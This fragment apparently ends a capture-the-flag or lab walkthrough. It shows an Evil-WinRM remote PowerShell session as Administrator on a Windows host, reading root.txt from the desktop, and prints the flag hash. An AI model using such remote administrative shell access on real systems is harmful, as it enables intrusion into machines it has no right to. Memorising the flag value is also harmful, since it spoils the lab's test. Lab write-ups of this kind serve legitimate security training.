*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
4375a629c7c67c8e29db269060c955cb
```